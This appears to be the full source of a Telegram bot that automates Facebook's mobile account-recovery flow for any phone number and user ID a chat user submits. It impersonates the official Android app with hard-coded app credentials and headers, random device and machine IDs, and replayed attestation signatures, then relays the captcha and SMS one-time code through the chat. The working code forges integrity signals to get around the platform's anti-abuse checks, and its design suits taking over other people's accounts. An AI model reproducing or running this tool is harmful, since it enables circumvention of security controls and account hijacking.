import os
import json
import uuid
import base64
import time
import random
import re
import requests
from flask import Flask, request, Response
import telebot

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
UPSTASH_REDIS_URL = os.environ.get("UPSTASH_REDIS_URL", "")
UPSTASH_REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_TOKEN", "")

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)
app = Flask(__name__)

STATE_IDLE = "idle"
STATE_WAITING_PHONE = "waiting_phone"
STATE_WAITING_CAPTCHA = "waiting_captcha"
STATE_WAITING_OTP = "waiting_otp"

SESSION_EXPIRE_SECONDS = 3600


def redis_set(key, value):
    url = f"{UPSTASH_REDIS_URL}/set/{key}"
    headers = {"Authorization": f"Bearer {UPSTASH_REDIS_TOKEN}"}
    body = json.dumps(value)
    r = requests.post(url, headers=headers, data=body)
    requests.post(
        f"{UPSTASH_REDIS_URL}/expire/{key}/{SESSION_EXPIRE_SECONDS}",
        headers=headers
    )
    return r.status_code == 200


def redis_get(key):
    url = f"{UPSTASH_REDIS_URL}/get/{key}"
    headers = {"Authorization": f"Bearer {UPSTASH_REDIS_TOKEN}"}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        data = r.json()
        if data.get("result") is not None:
            try:
                return json.loads(data["result"])
            except Exception:
                return data["result"]
    return None


def redis_del(key):
    url = f"{UPSTASH_REDIS_URL}/del/{key}"
    headers = {"Authorization": f"Bearer {UPSTASH_REDIS_TOKEN}"}
    requests.get(url, headers=headers)


def get_user_data(chat_id):
    data = redis_get(f"fb_bot:{chat_id}")
    if data is None:
        return {"state": STATE_IDLE, "session": None}
    return data


def save_user_data(chat_id, data):
    redis_set(f"fb_bot:{chat_id}", json.dumps(data))


def generate_machine_id():
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
    return ''.join(random.choices(chars, k=25))


def generate_machine_id_signals():
    raw = os.urandom(21)
    encoded = base64.b64encode(raw).decode().replace('+', '_').replace('/', 'F')
    return encoded[:28]


def generate_device_id():
    hex_part = ''.join(random.choices('0123456789abcdef', k=16))
    return f"android-{hex_part}"


def new_session(phone, uid):
    meta = str(uuid.uuid4())
    timestamp = int(time.time())
    challenge_nonce = (base64.b64encode(os.urandom(24)).decode()[:32].replace("+", "/").replace("=", ""))
    return {
        "meta": meta,
        "challenge_nonce": challenge_nonce,
        "timestamp": timestamp,
        "machine_id": generate_machine_id(),
        "machine_id_signals": generate_machine_id_signals(),
        "device_id_hex": generate_device_id(),
        "contextdata": "",
        "persistdata": "",
        "codecaptcha": "",
        "codeotp": "",
        "phonenum": phone,
        "uid": uid,
    }


FB_URL = "https://b-graph.facebook.com/graphql"
BLOKS_VERSION = "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a"
NT_CONTEXT = {
    "using_white_navbar": True,
    "styles_id": "6100e7e89411ccf67ace027cedecd84f",
    "pixel_ratio": 2,
    "is_push_on": True,
    "debug_tooling_metadata_token": None,
    "is_flipper_enabled": False,
    "theme_params": [{"value": [], "design_system_name": "FDS"}],
    "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a"
}


def base_headers(s, friendly_name, app_scope=None):
    return {
        'Host': 'b-graph.facebook.com',
        'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
        'X-Fb-Rmd': 'state=URL_ELIGIBLE',
        'Priority': 'u=0',
        'Content-Encoding': 'gzip',
        'X-Zero-Eh': '664c0faaac849cb891d0a261fbb72a12',
        'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/id_ID;FBRV/0;FBCR/PSN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960N;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
        'X-Fb-Friendly-Name': f'FbBloksActionRootQuery-{friendly_name}',
        'X-Fb-Integrity-Machine-Id': s['machine_id'],
        'X-Graphql-Request-Purpose': 'fetch',
        'X-Fb-Device-Group': '4025',
        'X-Tigon-Is-Retry': 'False',
        'X-Graphql-Client-Library': 'graphservice',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Fb-Net-Hni': '51000',
        'X-Fb-Sim-Hni': '51000',
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'X-Zero-State': 'unknown',
        'X-Meta-Zca': 'empty_token',
        'App-Scope-Id-Header': app_scope if app_scope else s['meta'],
        'X-Fb-Connection-Type': 'WIFI',
        'X-Meta-Usdid': f'{s["meta"]}.{s["timestamp"]}.MEUCIBc96mMH-irWbHDt32-0F2F_6fLWkd-3NyUQKof4t7dyAiEAsP7usXNBcNySth5bRsnDECJdI4TMVwXgiXZ436qgExk',
        'X-Fb-Http-Engine': 'Tigon/Liger',
        'X-Fb-Client-Ip': 'True',
        'X-Fb-Server-Cluster': 'True',
        'X-Fb-Conn-Uuid-Client': 'BB7L7V4vpPVxq7zHHKy26g==',
    }


def do_searchprefil(s):
    r = requests.Session()
    headers = base_headers(s, 'com.bloks.www.caa.ar.search.prefill.async', app_scope=str(uuid.uuid4()))
    params = {
        "method": "post", "pretty": "false", "format": "json",
        "server_timestamps": "true", "locale": "id_ID", "purpose": "fetch",
        "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.prefill.async",
        "fb_api_caller_class": "graphservice",
        "client_doc_id": "119940804217734265480409226803",
        "fb_api_client_context": json.dumps({"is_background": False}),
        "variables": json.dumps({
            "params": {
                "params": json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "username_input": "",
                            "si_device_param_network_info": {
                                "active_subscriptions_info": None,
                                "default_subscription_info": {
                                    "network_type": None, "is_data_roaming": 1, "is_esim": None,
                                    "is_gsm_roaming": 0, "is_sim_sms_capable": None,
                                    "is_mobile_data_enabled": 1, "sim_carrier_id": 1536,
                                    "sim_carrier_id_name": None, "sim_state": 5,
                                    "sim_operator": "51000",
                                    "sim_operator_name": "PT Pasifik Satelit Nusantara (ACeS)",
                                    "signal_strength": None, "group_id_level_1": None,
                                    "network_operator": "51000"
                                },
                                "is_airplane_mode": 0, "is_active_network_cellular": 0,
                                "is_device_sms_capable": 1, "sim_count": 1, "is_wifi": 1
                            },
                            "aac": json.dumps({
                                "aac_init_timestamp": s['timestamp'],
                                "aacjid": s['meta'],
                                "aaccs": "A-25O802Ctt8WMbwR6qy2Q0Fp2VgB6RmpsNB_sX0qTc"
                            }),
                            "device_id": s['meta'],
                            "lois_settings": {"lois_token": ""},
                            "cloud_trust_token": None,
                            "zero_balance_state": "init",
                            "network_bssid": None,
                            "stored_ar_context": "",
                            "has_session": 0
                        },
                        "server_params": {
                            "is_from_logged_out": 0, "layered_homepage_experiment_group": None,
                            "device_id": s['meta'], "login_surface": "login_home",
                            "waterfall_id": s['meta'], "event_source": "login_home_page",
                            "INTERNAL__latency_qpl_instance_id": 31403034000485,
                            "should_push_screen": 1, "is_platform_login": 0,
                            "back_nav_action": "BACK", "login_entry_point": "logged_out",
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "cds_screen_animation_type": "default",
                            "family_device_id": s['meta'],
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "x_app_device_signals": {
                                "MACHINE_ID": s['machine_id_signals'],
                                "DEVICE_ID": s['device_id_hex']
                            },
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0, "current_step": "LOGIN"
                        }
                    })
                }),
                "bloks_versioning_id": BLOKS_VERSION,
                "app_id": "com.bloks.www.caa.ar.search.prefill.async"
            },
            "scale": "2",
            "nt_context": NT_CONTEXT
        }),
        "fb_api_analytics_tags": json.dumps(["GraphServices"]),
        "client_trace_id": s['meta'],
    }
    resp = r.post(FB_URL, headers=headers, params=params, timeout=15)
    match = re.search(r'Ad[A-Za-z0-9_\-]{30,}\|arm', resp.text)
    if match:
        s['contextdata'] = match.group(0)


def do_searchasync(s):
    r = requests.Session()
    headers = base_headers(s, 'com.bloks.www.caa.ar.search.async')
    params = {
        "method": "post", "pretty": "false", "format": "json",
        "server_timestamps": "true", "locale": "id_ID", "purpose": "fetch",
        "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async",
        "fb_api_caller_class": "graphservice",
        "client_doc_id": "119940804217734265480409226803",
        "fb_api_client_context": json.dumps({"is_background": False}),
        "variables": json.dumps({
            "params": {
                "params": json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "blocked_uids": [],
                            "aac": json.dumps({
                                "aac_init_timestamp": s['timestamp'],
                                "aacjid": s['meta'],
                                "aaccs": "A-25O802Ctt8WMbwR6qy2Q0Fp2VgB6RmpsNB_sX0qTc"
                            }),
                            "flash_call_permissions_status": {
                                "READ_PHONE_STATE": "DENIED",
                                "READ_CALL_LOG": "DENIED",
                                "ANSWER_PHONE_CALLS": "DENIED"
                            },
                            "was_headers_prefill_available": 0,
                            "network_bssid": None, "sfdid": s['meta'],
                            "attestation_result": {
                                "keyHash": "7008928c7f46f8689586ee70512993534f7672d943a22ab8b5be82cedb80fee9",
                                "data": base64.b64encode(json.dumps({"challenge_nonce": s['challenge_nonce'], "search_query": s['phonenum']}).encode()).decode(),
                                "signature": "MEQCIGjE2soPfHP6yuNBOn/alyE116A1aTjxfUMtPEgj0IzAAiBMOudeiRnAWq4HDQChu9r+020uih9WeArNrUnvswMlyw=="
                            },
                            "fetched_email_token_list": {},
                            "search_query": s['phonenum'],
                            "auth_secure_device_id": "",
                            "ig_oauth_token": [],
                            "cloud_trust_token": None,
                            "was_headers_prefill_used": 0,
                            "sso_accounts_auth_data": [],
                            "encrypted_msisdn": "",
                            "device_network_info": {
                                "default_subscription_info": {
                                    "network_type": None, "is_data_roaming": 1, "is_esim": None,
                                    "is_gsm_roaming": 0, "is_sim_sms_capable": None,
                                    "is_mobile_data_enabled": 1, "sim_carrier_id": 1536,
                                    "sim_carrier_id_name": None, "sim_state": 5,
                                    "sim_operator": "51000",
                                    "sim_operator_name": "PT Pasifik Satelit Nusantara (ACeS)",
                                    "signal_strength": None, "group_id_level_1": None,
                                    "network_operator": "51000"
                                },
                                "sim_count": 1, "is_wifi": 1, "is_airplane_mode": 0,
                                "is_active_network_cellular": 0, "is_device_sms_capable": 1,
                                "active_subscriptions_info": None
                            },
                            "text_input_id": "571use:66",
                            "zero_balance_state": None,
                            "android_build_type": "",
                            "sim_state": 5,
                            "accounts_list": [{"uid": s['uid'], "credential_type": "local_auth", "token": ""}],
                            "is_oauth_without_permission": 0,
                            "gms_incoming_call_retriever_eligibility": "not_eligible",
                            "search_screen_type": "mobile",
                            "is_whatsapp_installed": 0,
                            "lois_settings": {"lois_token": ""},
                            "ig_vetted_device_nonce": "",
                            "headers_infra_flow_id": s['meta'],
                            "fetched_email_list": []
                        },
                        "server_params": {
                            "event_request_id": s['meta'],
                            "is_from_logged_out": 0, "layered_homepage_experiment_group": None,
                            "device_id": s['meta'], "login_surface": "login_home",
                            "waterfall_id": s['meta'],
                            "INTERNAL__latency_qpl_instance_id": 31417475000120,
                            "is_platform_login": 0, "context_data": s['contextdata'],
                            "login_entry_point": "logged_out",
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "family_device_id": s['meta'],
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "x_app_device_signals": {
                                "MACHINE_ID": s['machine_id_signals'],
                                "DEVICE_ID": s['device_id_hex']
                            },
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    })
                }),
                "bloks_versioning_id": BLOKS_VERSION,
                "app_id": "com.bloks.www.caa.ar.search.async"
            },
            "scale": "2",
            "nt_context": NT_CONTEXT
        }),
        "fb_api_analytics_tags": json.dumps(["GraphServices"]),
        "client_trace_id": s['meta']
    }
    resp = r.post(FB_URL, headers=headers, params=params, timeout=15)
    match = re.search(r'Ad[A-Za-z0-9_\-]{30,}\|arm', resp.text)
    if match:
        s['contextdata'] = match.group(0)


def do_authselection(s):
    r = requests.Session()
    headers = base_headers(s, 'com.bloks.www.caa.ar.auth_option_selection.async')
    headers['X-Fb-Conn-Uuid-Client'] = '9HJxKBEZBnNzTtUXmFGhwQ=='
    params = {
        "method": "post", "pretty": "false", "format": "json",
        "server_timestamps": "true", "locale": "id_ID", "purpose": "fetch",
        "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.auth_option_selection.async",
        "fb_api_caller_class": "graphservice",
        "client_doc_id": "119940804217734265480409226803",
        "fb_api_client_context": json.dumps({"is_background": False}),
        "variables": json.dumps({
            "params": {
                "params": json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "aac": json.dumps({
                                "aac_init_timestamp": s['timestamp'],
                                "aacjid": s['meta'],
                                "aaccs": "A-25O802Ctt8WMbwR6qy2Q0Fp2VgB6RmpsNB_sX0qTc"
                            }),
                            "auth_option": "phone",
                            "zero_balance_state": "init",
                            "network_bssid": None,
                            "attestation_result": {
                                "keyHash": "7008928c7f46f8689586ee70512993534f7672d943a22ab8b5be82cedb80fee9",
                                "data": base64.b64encode(json.dumps({"auth_option": "phone", "challenge_nonce": s['challenge_nonce']}).encode()).decode(),
                                "signature": "MEUCIQCLIVMWjJKTMIga+N+NnXO0U+SVUax5qzXZG9vLDtIN3AIgcJ60/rr3VHDj7qtrRI4v8jv00peCnhZKoi782B4fMl0="
                            },
                            "machine_id": s['machine_id'],
                            "selected_phone_number_index": None,
                            "android_build_type": "",
                            "emails": [],
                            "selected_xapp_contactpoint_index": 0,
                            "selected_encrypted_bloks_xapp_cp_lookup_data": "",
                            "family_device_id": s['meta'],
                            "lois_settings": {"lois_token": ""},
                            "cloud_trust_token": None,
                            "tokens": []
                        },
                        "server_params": {
                            "event_request_id": s['meta'],
                            "is_from_logged_out": 0, "layered_homepage_experiment_group": None,
                            "serialized_states": {"is_loading": "4;b5u69q112;0"},
                            "device_id": s['meta'], "login_surface": "account_recovery",
                            "waterfall_id": s['meta'], "is_oauth_eligible": 0,
                            "lara_usage": 1,
                            "INTERNAL__latency_qpl_instance_id": 31489712400156,
                            "is_platform_login": 0, "context_data": s['contextdata'],
                            "login_entry_point": "account_recovery",
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "family_device_id": s['meta'],
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "auth_options": ["push_to_session", "flash_call", "phone", "password"],
                            "x_app_device_signals": {
                                "MACHINE_ID": s['machine_id_signals'],
                                "DEVICE_ID": s['device_id_hex']
                            },
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    })
                }),
                "bloks_versioning_id": BLOKS_VERSION,
                "app_id": "com.bloks.www.caa.ar.auth_option_selection.async"
            },
            "scale": "2",
            "nt_context": NT_CONTEXT
        }),
        "fb_api_analytics_tags": json.dumps(["GraphServices"]),
        "client_trace_id": s['meta']
    }
    resp = r.post(FB_URL, headers=headers, params=params, timeout=15)
    resp_text = resp.text
    clean_text = re.sub(r'\\+/', '/', resp_text)

    match_ctx = re.search(r'Ad[A-Za-z0-9_\-]{30,}\|arm', clean_text)
    if match_ctx:
        s['contextdata'] = match_ctx.group(0)

    match_persist = re.search(r'captcha_persist_data=([A-Za-z0-9_\-]+)', clean_text)
    if match_persist:
        s['persistdata'] = match_persist.group(1)

    captcha_url = None
    match_img = re.search(r'https://www\.facebook\.com/captcha/tfbimage/[^\s"\'\\]+', clean_text)
    if match_img:
        captcha_url = match_img.group(0).rstrip('\\')

    return captcha_url


def do_smscaptcha(s):
    r = requests.Session()
    headers = base_headers(s, 'com.bloks.www.caa.ar.sms_captcha.async', app_scope='34c6b00f-d6c0-4095-8b94-3ce4316a228d')
    headers['X-Fb-Conn-Uuid-Client'] = '9HJxKBEZBnNzTtUXmFGhwQ=='
    params = {
        "method": "post", "pretty": "false", "format": "json",
        "server_timestamps": "true", "locale": "id_ID", "purpose": "fetch",
        "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.sms_captcha.async",
        "fb_api_caller_class": "graphservice",
        "client_doc_id": "119940804217734265480409226803",
        "fb_api_client_context": json.dumps({"is_background": False}),
        "fb_api_analytics_tags": json.dumps(["GraphServices"]),
        "client_trace_id": s['meta'],
        "variables": json.dumps({
            "params": {
                "params": json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "aac": json.dumps({
                                "aac_init_timestamp": s['timestamp'],
                                "aacjid": s['meta'],
                                "aaccs": "A-25O802Ctt8WMbwR6qy2Q0Fp2VgB6RmpsNB_sX0qTc"
                            }),
                            "lois_settings": {"lois_token": ""},
                            "cloud_trust_token": None,
                            "zero_balance_state": "init",
                            "network_bssid": None,
                            "captcha_response": s['codecaptcha'],
                            "persist_data": s['persistdata'],
                            "android_build_type": ""
                        },
                        "server_params": {
                            "event_request_id": s['meta'],
                            "is_from_logged_out": 0, "layered_homepage_experiment_group": None,
                            "device_id": s['meta'], "login_surface": "account_recovery",
                            "waterfall_id": s['meta'], "machine_id": s['machine_id'],
                            "INTERNAL__latency_qpl_instance_id": 31964439500087,
                            "is_platform_login": 0, "context_data": s['contextdata'],
                            "login_entry_point": "account_recovery",
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "family_device_id": s['meta'],
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "x_app_device_signals": {
                                "MACHINE_ID": s['machine_id_signals'],
                                "DEVICE_ID": s['device_id_hex']
                            },
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    })
                }),
                "bloks_versioning_id": BLOKS_VERSION,
                "app_id": "com.bloks.www.caa.ar.sms_captcha.async"
            },
            "scale": "2",
            "nt_context": NT_CONTEXT
        })
    }
    resp = r.post(FB_URL, headers=headers, params=params, timeout=15)
    resp_text = resp.text
    clean_text = re.sub(r'\\+/', '/', resp_text)

    match_ctx = re.search(r'Ad[A-Za-z0-9_\-]{30,}\|arm', clean_text)
    if match_ctx:
        s['contextdata'] = match_ctx.group(0)
        print(f"[✓] contextdata diperbarui dari smscaptcha")
    else:
        print(f"[!] contextdata tidak ditemukan di response smscaptcha")

    return resp_text


def do_sumbitcode(s):
    r = requests.Session()
    headers = {
        'Host': 'b-graph.facebook.com',
        'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
        'X-Fb-Rmd': 'state=URL_ELIGIBLE',
        'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/id_ID;FBRV/0;FBCR/PSN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960N;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
        'X-Zero-F-Device-Id': '3c02a314-ffb1-464f-9d8d-6c5d48019f1e',
        'X-Graphql-Request-Purpose': 'fetch',
        'X-Fb-Friendly-Name': 'FbBloksActionRootQuery-com.bloks.www.caa.ar.submit_code.async',
        'X-Graphql-Client-Library': 'graphservice',
        'X-Zero-Eh': '664c0faaac849cb891d0a261fbb72a12',
        'X-Fb-Device-Group': '4025',
        'X-Fb-Integrity-Machine-Id': s['machine_id'],
        'X-Meta-Tasos-Tlbwe-Config': 'quic_transport_bwe:config_33',
        'X-Fb-Appnetsession-Nid': 'dd36e8ce36d08145d4ac973681cf1848,Wifi',
        'X-Fb-Sim-Hni': '51000',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'X-Fb-Connection-Type': 'WIFI',
        'X-Fb-Net-Hni': '51000',
        'X-Meta-Zca': 'empty_token',
        'App-Scope-Id-Header': 'c113e638-205b-4989-9cc5-d739e7ca00db',
        'X-Meta-Usdid': f'0b14fd29-d958-4626-99d8-4111e0254691.{s["timestamp"]}.MEQCIFZJyfej17Nw0l0_i6-etLsCst17zOHD9UY50nB-QRP5AiBe-UThDwh3GCrh5VqJaB9gDhaiYE48XLOhs3kpPdlFCA',
        'X-Fb-Network-Properties': 'Wifi;Validated;',
        'Content-Encoding': 'gzip',
        'Priority': 'u=0',
        'X-Fb-Qpl-Active-Flows-Json': '{"schema_version":"v3","inprogress_qpls":[],"snapshot_attributes":{}}',
        'X-Fb-Congestion-Signal': '0',
        'X-Meta-Enable-Tasos-Ss-Bwe': '1',
        'X-Fb-Tasos-Experimental': '1',
        'X-Fb-Appnetsession-Sid': '123701e0d2e6b4105f436a5f546320d6',
        'X-Tigon-Is-Retry': 'False',
        'X-Fb-Http-Engine': 'Tigon/Liger',
        'X-Fb-Client-Ip': 'True',
        'X-Fb-Server-Cluster': 'True',
        'X-Fb-Conn-Uuid-Client': 'FMX+W49lMOvVghfJMpZ5/g==',
    }
    params = {
        "method": "post", "pretty": "false", "format": "json",
        "server_timestamps": "true", "locale": "id_ID", "purpose": "fetch",
        "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.submit_code.async",
        "fb_api_caller_class": "graphservice",
        "client_doc_id": "119940804217734265480409226803",
        "fb_api_client_context": json.dumps({"is_background": False}),
        "fb_api_analytics_tags": json.dumps(["GraphServices"]),
        "client_trace_id": s['meta'],
        "variables": json.dumps({
            "params": {
                "params": json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "auth_secure_device_id": "",
                            "is_sms_retriever_success": 0,
                            "aac": json.dumps({
                                "aac_init_timestamp": s['timestamp'],
                                "aacjid": s['meta'],
                                "aaccs": "vq7O_VhKQrLeEGbSEagQFTJyr-PkufYgApaTAddqu14"
                            }),
                            "block_store_machine_id": None,
                            "lois_settings": {"lois_token": ""},
                            "cloud_trust_token": None,
                            "network_bssid": None,
                            "machine_id": s['machine_id'],
                            "nonce": s['codeotp'],
                            "encrypted_msisdn": "",
                            "nonce_length": 6
                        },
                        "server_params": {
                            "event_request_id": s['meta'],
                            "is_from_logged_out": 0,
                            "text_input_id": 60409808900035,
                            "layered_homepage_experiment_group": None,
                            "device_id": s['meta'], "login_surface": "account_recovery",
                            "waterfall_id": s['meta'], "lara_usage": "true",
                            "machine_id": s['machine_id'],
                            "INTERNAL__latency_qpl_instance_id": 60409808900126,
                            "is_platform_login": 0, "context_data": s['contextdata'],
                            "login_entry_point": "account_recovery",
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "code_submit_source": "manual",
                            "family_device_id": s['meta'],
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "x_app_device_signals": {
                                "MACHINE_ID": s['machine_id_signals'],
                                "DEVICE_ID": s['device_id_hex']
                            },
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    })
                }),
                "bloks_versioning_id": BLOKS_VERSION,
                "app_id": "com.bloks.www.caa.ar.submit_code.async"
            },
            "scale": "2",
            "nt_context": {
                "using_white_navbar": True,
                "styles_id": "6100e7e89411ccf67ace027cedecd84f",
                "pixel_ratio": 2, "is_push_on": True,
                "debug_tooling_metadata_token": None, "is_flipper_enabled": False,
                "theme_params": [
                    {"value": ["three_neutral_gray"], "design_system_name": "XMDS"},
                    {"value": ["DARKER_PRIMARY_DEEMPHASIZED_BUTTON_BACKGROUND_TEST"], "design_system_name": "FDS"}
                ],
                "bloks_version": BLOKS_VERSION
            }
        })
    }
    resp = r.post(FB_URL, headers=headers, params=params, timeout=15)
    return resp.text


@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    save_user_data(chat_id, {"state": STATE_WAITING_PHONE, "session": None})
    bot.send_message(
        chat_id,
        "👋 *Selamat datang!*\n\n"
        "Kirim nomor HP dan UID kamu dalam format:\n"
        "`+nomorhp|uid`\n\n"
        "Contoh: `+628123456789|123456789`",
        parse_mode="Markdown"
    )


@bot.message_handler(func=lambda msg: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip() if message.text else ""

    user_data = get_user_data(chat_id)
    state = user_data.get("state", STATE_IDLE)
    s = user_data.get("session")

    if state in (STATE_IDLE, STATE_WAITING_PHONE):
        if '|' in text and text.startswith('+'):
            parts = text.split('|', 1)
            phone = parts[0].strip()
            uid = parts[1].strip()
            s = new_session(phone, uid)
            bot.send_message(chat_id, "⏳ Memproses... mohon tunggu sebentar.")
            try:
                do_searchprefil(s)
                do_searchasync(s)
                captcha_url = do_authselection(s)

                if captcha_url:
                    try:
                        img_resp = requests.get(captcha_url, timeout=15)
                        if img_resp.status_code == 200:
                            bot.send_photo(
                                chat_id,
                                img_resp.content,
                                caption="🔐 *Captcha Facebook*\n\nKetik kode yang terlihat di gambar ini:",
                                parse_mode="Markdown"
                            )
                            save_user_data(chat_id, {"state": STATE_WAITING_CAPTCHA, "session": s})
                        else:
                            bot.send_message(chat_id, f"⚠️ Gagal download gambar captcha.\nBuka URL ini:\n{captcha_url}")
                            bot.send_message(chat_id, "✏️ Lalu ketik kode captcha di sini:")
                            save_user_data(chat_id, {"state": STATE_WAITING_CAPTCHA, "session": s})
                    except Exception as e:
                        bot.send_message(chat_id, f"⚠️ Error ambil gambar: {e}")
                        save_user_data(chat_id, {"state": STATE_IDLE, "session": None})
                else:
                    bot.send_message(chat_id, "⚠️ URL captcha tidak ditemukan. Coba lagi.\n\nKirim: `+nomorhp|uid`", parse_mode="Markdown")
                    save_user_data(chat_id, {"state": STATE_IDLE, "session": None})

            except Exception as e:
                bot.send_message(chat_id, f"❌ Error saat proses awal: {e}\n\nCoba kirim lagi: `+nomorhp|uid`", parse_mode="Markdown")
                save_user_data(chat_id, {"state": STATE_IDLE, "session": None})
        else:
            bot.send_message(
                chat_id,
                "❓ Format tidak dikenali.\n\n"
                "Kirim dalam format:\n"
                "`+nomorhp|uid`\n\n"
                "Contoh: `+628123456789|123456789`",
                parse_mode="Markdown"
            )

    elif state == STATE_WAITING_CAPTCHA:
        if not s:
            bot.send_message(chat_id, "⚠️ Sesi habis. Kirim ulang: `+nomorhp|uid`", parse_mode="Markdown")
            save_user_data(chat_id, {"state": STATE_IDLE, "session": None})
            return
        s['codecaptcha'] = text
        bot.send_message(chat_id, "⏳ Mengirim kode captcha...")
        try:
            do_smscaptcha(s)
            save_user_data(chat_id, {"state": STATE_WAITING_OTP, "session": s})
            bot.send_message(chat_id, "📱 *SMS OTP sudah dikirim!*\n\n✏️ Ketik kode OTP yang kamu terima:", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error saat submit captcha: {e}\n\nKetik ulang kode captcha:")
            save_user_data(chat_id, {"state": STATE_WAITING_CAPTCHA, "session": s})

    elif state == STATE_WAITING_OTP:
        if not s:
            bot.send_message(chat_id, "⚠️ Sesi habis. Kirim ulang: `+nomorhp|uid`", parse_mode="Markdown")
            save_user_data(chat_id, {"state": STATE_IDLE, "session": None})
            return
        s['codeotp'] = text
        bot.send_message(chat_id, "⏳ Mengirim kode OTP...")
        try:
            result = do_sumbitcode(s)
            bot.send_message(
                chat_id,
                f"✅ *Selesai!* Response dari server:\n\n```{result[:3000]}```",
                parse_mode="Markdown"
            )
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error saat submit OTP: {e}")

        save_user_data(chat_id, {"state": STATE_IDLE, "session": None})
        bot.send_message(
            chat_id,
            "🔄 Kamu bisa langsung kirim nomor dan uid lagi tanpa /start:\n`+nomorhp|uid`",
            parse_mode="Markdown"
        )
    else:
        save_user_data(chat_id, {"state": STATE_IDLE, "session": None})
        bot.send_message(chat_id, "⚠️ Kirim: `+nomorhp|uid`", parse_mode="Markdown")


@app.route("/webhook", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        json_string = request.get_data().decode("utf-8")
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return Response("ok", status=200)
    return Response("bad request", status=400)


@app.route("/", methods=["GET"])
def index():
    return Response("Bot aktif!", status=200)


@app.route("/set_webhook", methods=["GET"])
def set_webhook():
    webhook_url = request.args.get("url")
    if not webhook_url:
        return Response("Tambahkan https://fb-recovery-bot.vercel.app/set_webhook?url=https://fb-recovery-bot.vercel.app/webhook", status=400)
    result = bot.set_webhook(url=webhook_url)
    if result:
        return Response(f"Webhook berhasil diset ke: {webhook_url}", status=200)
    return Response("Gagal set webhook", status=500)
